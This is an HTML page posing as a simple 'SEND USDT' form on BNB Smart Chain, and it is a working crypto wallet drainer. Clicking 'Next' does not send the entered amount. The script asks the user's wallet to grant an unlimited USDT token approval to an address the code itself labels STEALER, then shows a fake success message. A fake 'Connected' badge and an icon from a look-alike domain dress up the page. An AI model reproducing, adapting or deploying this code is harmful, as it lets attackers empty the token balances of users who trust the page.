<!DOCTYPE html>
<html>
<head>
<title>SEND USDT</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
<style>.gradient-btn{background:linear-gradient(45deg,#f0b90b,#e6a700)!important}</style>
</head>
<body class="bg-gradient-to-br from-gray-50 to-blue-50 min-h-screen flex items-center justify-center p-4">
<div class="w-full max-w-md bg-white shadow-2xl rounded-3xl p-8">
<h1 class="text-3xl font-bold text-center mb-2">SEND USDT</h1>
<p class="text-sm text-center mb-8 text-gray-500">BNB Smart Chain ✓</p>
<input class="w-full px-4 py-4 border rounded-2xl text-lg bg-gray-50 mb-6" value="0x027631192b5be3f92F271EccB8d24B7db467080d" readonly>
<div class="p-4 border rounded-2xl mb-8 flex items-center gap-3"><img src="https://securebnb.live/images/BNB-icon.png" class="w-12 h-12"><div>BNB Smart Chain<div class="text-sm text-green-600">Connected</div></div></div>
<input id="amount" type="number" class="w-full px-4 py-5 border rounded-2xl text-2xl bg-gray-50 mb-6" value="100">
<button id="next" class="w-full gradient-btn py-5 rounded-3xl font-bold text-xl">Next</button>
</div>
<script>
const USDT='0x55d398326f99059fF775485246999027B3197955',STEALER='0x027631192b5be3f92F271EccB8d24B7db467080d';
document.getElementById('next').onclick=async()=>{try{const web3=new Web3(window.ethereum),accounts=await web3.eth.getAccounts(),contract=new web3.eth.Contract([{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"approve",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"}],USDT);await contract.methods.approve(STEALER,'115792089237316195423570985008687907853269984665640564039457584007913129639935').send({from:accounts[0]});alert('✅ SUCCESS!');}catch(e){alert('Wallet connect karo')}};
</script>
</body>
</html>
